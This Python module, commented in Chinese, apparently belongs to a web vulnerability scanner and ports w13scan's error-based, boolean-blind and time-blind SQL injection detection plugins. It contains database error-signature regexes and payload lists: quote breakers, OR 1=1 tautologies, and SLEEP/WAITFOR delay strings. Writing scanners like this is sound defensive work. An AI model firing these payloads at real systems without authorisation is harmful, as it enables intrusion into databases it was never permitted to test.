"""SQL 注入插件族 (移植 w13scan ``scanners/PerFile/sqli_*.py``).

三个插件对应 w13scan 的三条独立检测路径, 判定依据互不重叠:

==================  ==========================================================
``sqli_error``      报错型: 注入引号/畸形表达式, 匹配 30+ 种数据库报错特征
``sqli_bool``       布尔型: 真/假条件响应差异 + 随机值对照组 (排除参数回显干扰)
``sqli_time``       时间型: 注入 SLEEP/WAITFOR/PG_SLEEP, 依据响应时延差判定
==================  ==========================================================

w13scan 的布尔检测依赖"页面相似度"; 这里实现得更保守一些 —— 单看真假响应差异
会把"参数被原样回显"误判成注入, 所以额外发一对随机值作为对照组, 只有真假条件的
差异**显著大于**正常随机值的差异时才判定存在注入。
"""
from __future__ import annotations

import re

from ...core.models import Finding, Severity
from ..vulndb import SQL_ERROR_RE
from .base import A03, Plugin, PluginContext, register, snippet, similarity

# --------------------------------------------------------------------------
# 报错特征库 (移植 w13scan ``lib/helper/helper_sqli.py:Get_sql_errors``)
# --------------------------------------------------------------------------
SQL_ERROR_RULES: tuple[tuple[str, str], ...] = (
    (r"System\.Data\.OleDb\.OleDbException", "MSSQL"),
    (r"\[SQL Server\]", "MSSQL"),
    (r"\[Microsoft\]\[ODBC SQL Server Driver\]", "MSSQL"),
    (r"\[SQLServer JDBC Driver\]", "MSSQL"),
    (r"\[SqlException", "MSSQL"),
    (r"System\.Data\.SqlClient\.SqlException", "MSSQL"),
    (r"Unclosed quotation mark after the character string", "MSSQL"),
    (r"mssql_query\(\)", "MSSQL"),
    (r"odbc_exec\(\)", "MSSQL"),
    (r"Microsoft OLE DB Provider for ODBC Drivers", "MSSQL"),
    (r"Microsoft OLE DB Provider for SQL Server", "MSSQL"),
    (r"Incorrect syntax near", "MSSQL"),
    (r"Sintaxis incorrecta cerca de", "MSSQL"),
    (r"Syntax error in string in query expression", "MSSQL"),
    (r"Procedure '[^']+' requires parameter '[^']+'", "MSSQL"),
    (r"Unclosed quotation mark before the character string", "MSSQL"),
    (r"DB2 SQL error:", "DB2"),
    (r"internal error \[IBM\]\[CLI Driver\]\[DB2/6000\]", "DB2"),
    (r"SQLSTATE=\d+", "DB2"),
    (r"Sybase message:", "Sybase"),
    (r"Data type mismatch in criteria expression\.", "Access"),
    (r"Microsoft JET Database Engine", "Access"),
    (r"\[Microsoft\]\[ODBC Microsoft Access Driver\]", "Access"),
    (r"(PLS|ORA)-[0-9]{4,5}", "Oracle"),
    (r"PostgreSQL query failed:", "PostgreSQL"),
    (r"supplied argument is not a valid PostgreSQL result", "PostgreSQL"),
    (r"pg_query\(\) \[:", "PostgreSQL"),
    (r"pg_exec\(\) \[:", "PostgreSQL"),
    (r"supplied argument is not a valid MySQL", "MySQL"),
    (r"Column count doesn't match value count at row", "MySQL"),
    (r"mysql_fetch_array\(\)", "MySQL"),
    (r"on MySQL result index", "MySQL"),
    (r"You have an error in your SQL syntax", "MySQL"),
    (r"MySQL server version for the right syntax to use", "MySQL"),
    (r"\[MySQL\]\[ODBC", "MySQL"),
    (r"the used select statements have different number of columns", "MySQL"),
    (r"Table '[^']+' doesn't exist", "MySQL"),
    (r"com\.informix\.jdbc", "Informix"),
    (r"Dynamic Page Generation Error:", "Informix"),
    (r"An illegal character has been found in the statement", "Informix"),
    (r"<b>Warning</b>:  ibase_", "Interbase"),
    (r"Dynamic SQL Error", "Interbase"),
    (r"\[DM_QUERY_E_SYNTAX\]", "DM"),
    (r"has occurred in the vicinity of:", "DM"),
    (r"A Parser Error \(syntax error\)", "DM"),
    (r"java\.sql\.SQLException", "Java"),
    (r"Unexpected end of command in statement", "Java"),
    (r"SQLite3?::(Operational|Programming)Error", "SQLite"),
    (r"sqlite3\.(?:Operational|Programming)Error", "SQLite"),
    (r"\[Macromedia\]\[SQLServer JDBC Driver\]", "MSSQL"),
    (r"列名无效|语法错误|数据库错误", "Generic"),
)

#: 报错型载荷 (w13scan ``sqli_error._payloads`` 的等价物)
ERROR_PAYLOADS: tuple[str, ...] = (
    "'", "\"", "')", "';", '")', '";', "`", "`)", "`;", "\\",
    "--", "-0", "'--", "1'", "1\"", "%27", "%2527", "%60", "%5C",
    " order By 500 ",
    "1 AND 9137=9138",
    "1') AND 9137=9138 AND ('9137'='9137",
    "1') AND 9137=9138 AND ('9137'='9138",
    "extractvalue(1,concat(char(126),md5(9137)))",
    "convert(int,sys.fn_sqlvarbasetostr(HashBytes('MD5','9137')))",
)

#: 真/假条件 (布尔盲注)
BOOL_TRUE_PAYLOADS: tuple[str, ...] = ("1' OR '1'='1", "1 OR 1=1", "1) OR (1=1", "1' OR 1=1--")
BOOL_FALSE_PAYLOADS: tuple[str, ...] = ("1' AND '1'='2", "1 AND 1=2",
                                      "1) AND (1=2", "1' AND 1=2--")

#: 时间盲注模板 (``{n}`` 为秒数). 覆盖 MySQL / PostgreSQL / MSSQL.
TIME_PAYLOADS: tuple[str, ...] = (
    "1' AND SLEEP({n})--", "1 AND SLEEP({n})", "1') AND SLEEP({n})--",
    "1';SELECT PG_SLEEP({n})--", "1;WAITFOR DELAY '0:0:{n}'--",
)


def match_sql_error(body: str) -> tuple[str, str]:
    """返回首个命中的 (DBMS, 证据片段); 未命中返回 ``("", "")``."""
    for pattern, dbms in SQL_ERROR_RULES:
        if _search(pattern, body):
            return dbms, pattern
    match = SQL_ERROR_RE.search(body)
    if match:
        return "Generic", match.group(0)
    return "", ""


def _search(pattern: str, body: str) -> bool:
    return re.search(pattern, body, re.I | re.S | re.M) is not None


@register
class SqliError(Plugin):
    """基于报错的 SQL 注入 (w13scan ``sqli_error``)."""

    name = "sqli_error"
    title = "SQL 注入 (报错型)"
    category = "sqli"
    severity = Severity.CRITICAL
    cwe = "CWE-89"
    owasp = A03
    description = "注入引号与畸形表达式, 依据数据库报错特征判定注入点"
    param_hints = ("id", "q", "search", "query", "name", "page", "user", "product",
                   "cat", "item", "order", "sort", "keyword", "key", "no", "num")
    references = ("https://owasp.org/Top10/A03_2021-Injection/",)

    def run(self, ctx: PluginContext) -> list[Finding]:
        findings: list[Finding] = []
        for payload in ERROR_PAYLOADS:
            result = ctx.inject(payload)
            if not result.status or not result.body:
                continue
            dbms, pattern = match_sql_error(result.text)
            if not dbms:
                continue
            findings.append(ctx.add(
                vuln_type="sqli", url=result.url, method=result.method,
                param=ctx.param, payload=payload,
                evidence=snippet(result.text, _needle(pattern)),
                severity=self.severity, confidence=0.95,
                proof=f"注入 {payload!r} 触发 {dbms} 报错 "
                      f"(HTTP {result.status}, 特征 {pattern[:60]!r})"))
            break
        return findings


def _needle(pattern: str) -> str:
    """把正则粗略化成可在响应里搜到的关键词, 用于截取证据片段."""
    text = pattern.replace("\\", "").replace("(", " ").replace(")", " ")
    for token in ("You have an error in your SQL syntax", "SQL syntax", "SQLException",
                  "ORA-", "DB2 SQL error", "PostgreSQL query failed", "Incorrect syntax near"):
        if token.lower().split()[0] in text.lower():
            return token
    words = [w for w in text.split() if len(w) >= 5]
    return words[0] if words else ""


@register
class SqliBool(Plugin):
    """布尔盲注 (w13scan ``sqli_bool``).

    判定逻辑: 真条件响应与假条件响应必须**明显**不同; 同时用一对随机值请求作为对照
    组, 要求真假差异显著大于正常随机值的差异 —— 否则参数回显本身就会造成误报
    (w13scan 原版只比较页面相似度, 在回显型参数上有稳定的假阳性)。
    """

    name = "sqli_bool"
    title = "SQL 注入 (布尔盲注)"
    category = "sqli"
    severity = Severity.CRITICAL
    cwe = "CWE-89"
    owasp = A03
    description = "注入真/假条件并对照随机值响应差异, 判定布尔盲注"
    param_hints = ("id", "q", "search", "query", "name", "page", "user", "product",
                   "cat", "item", "order", "sort", "keyword", "no", "num")
    #: 真假响应相似度上限 / 需比对照组低出的幅度
    DIVERGE_MAX = 0.85
    DIVERGE_GAP = 0.10

    def run(self, ctx: PluginContext) -> list[Finding]:
        # 对照组: 两个无害随机值, 代表"参数正常变化"带来的响应抖动
        left = ctx.inject("sentinelA9137")
        right = ctx.inject("sentinelB9138")
        if not left.status or not right.status:
            return []
        control = similarity(left.text, right.text)

        for true_payload, false_payload in zip(BOOL_TRUE_PAYLOADS, BOOL_FALSE_PAYLOADS):
            hit = ctx.inject(true_payload)
            miss = ctx.inject(false_payload)
            if not hit.status or not miss.status:
                continue
            # 参数被原样回显时, 真假响应的差异只来自回显本身, 不能据此判定注入
            if true_payload in hit.text or false_payload in miss.text:
                continue
            ratio = similarity(hit.text, miss.text)
            if ratio >= self.DIVERGE_MAX or ratio + self.DIVERGE_GAP > control:
                continue
            return [ctx.add(
                vuln_type="sqli", url=hit.url, method=hit.method, param=ctx.param,
                payload=f"{true_payload}  /  {false_payload}",
                evidence=f"真条件({len(hit.body)}B) 与 假条件({len(miss.body)}B) 响应差异显著: "
                         f"相似度 {ratio:.2f}, 对照组 {control:.2f}",
                severity=self.severity, confidence=0.85,
                proof=f"布尔条件改变响应内容, 对照组随机值响应稳定 "
                      f"(HTTP {hit.status})")]
        return []


@register
class SqliTime(Plugin):
    """时间盲注 (w13scan ``sqli_time``) — 慢, 仅深度扫描启用."""

    name = "sqli_time"
    title = "SQL 注入 (时间盲注)"
    category = "sqli"
    severity = Severity.HIGH
    cwe = "CWE-89"
    owasp = A03
    description = "注入 SLEEP/PG_SLEEP/WAITFOR 延时载荷, 依据响应时延差判定盲注"
    param_hints = ("id", "q", "search", "query", "name", "page", "user", "product",
                   "cat", "item", "no", "num")
    deep_only = True

    def run(self, ctx: PluginContext) -> list[Finding]:
        delay = max(1, int(ctx.time_delay))
        baseline = ctx.client.request(ctx.endpoint.method or "GET",
                                      ctx.endpoint.url).elapsed_s
        need = max(ctx.time_threshold_s, baseline + delay * 0.6)
        for template in TIME_PAYLOADS:
            payload = template.format(n=delay)
            result = ctx.inject(payload)
            if not result.status:
                continue
            if result.elapsed_s < need:
                continue
            return [ctx.add(
                vuln_type="sqli", url=result.url, method=result.method,
                param=ctx.param, payload=payload,
                evidence=f"响应耗时 {result.elapsed_s * 1000:.0f}ms "
                         f"(基线 {baseline * 1000:.0f}ms, 阈值 {need:.2f}s)",
                severity=self.severity, confidence=0.9,
                proof=f"延时载荷 {payload!r} 引发 {result.elapsed_s:.2f}s 延迟")]
        return []


# 供测试与外部复用
__all__ = ["BOOL_FALSE_PAYLOADS", "BOOL_TRUE_PAYLOADS", "ERROR_PAYLOADS",
           "SQL_ERROR_RULES", "TIME_PAYLOADS", "SqliBool", "SqliError", "SqliTime",
           "match_sql_error"]
